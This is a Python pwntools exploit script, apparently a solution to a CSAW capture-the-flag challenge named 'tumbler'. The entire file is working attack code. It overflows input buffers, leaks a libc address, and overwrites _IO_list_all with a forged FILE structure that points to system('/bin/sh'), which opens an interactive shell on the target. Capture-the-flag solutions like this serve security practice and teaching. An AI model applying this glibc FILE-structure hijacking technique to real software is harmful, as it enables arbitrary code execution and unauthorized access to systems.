from pwn import *

e = ELF("./tumbler")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.chal.csaw.io", 1000)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("enter")
p.sendline("A")
p.recvuntil("enter")
p.sendline("A" * 0x80)
p.recvuntil("y/n")
p.sendline("n")
p.sendline("A" * 7)
p.recvuntil("y/n")
p.sendline("y")

p.recvuntil("Address:")
p.recvline()

leak = u64(p.recvline(keepends=False)[:6] + "\x00\x00") - 0x7f18390bebf8 + 0x00007f1838cfa000
print("{:#x}".format(leak))


p.recvuntil("?")
p.send(str(leak + libc.symbols["_IO_list_all"]))
p.recvuntil("?")

p.sendline(
  p64(leak + libc.symbols["_IO_list_all"] + 8)
+ ("/bin/sh\x00" + p64(leak + libc.symbols["system"]) + p64(0) * 3 + p64(0x1001)).ljust(0xc0, "\x00")
+ "\x00" * 8 * 3
+ p64(leak + libc.symbols["_IO_list_all"] + 0x10 - 0x18)
)


p.interactive()
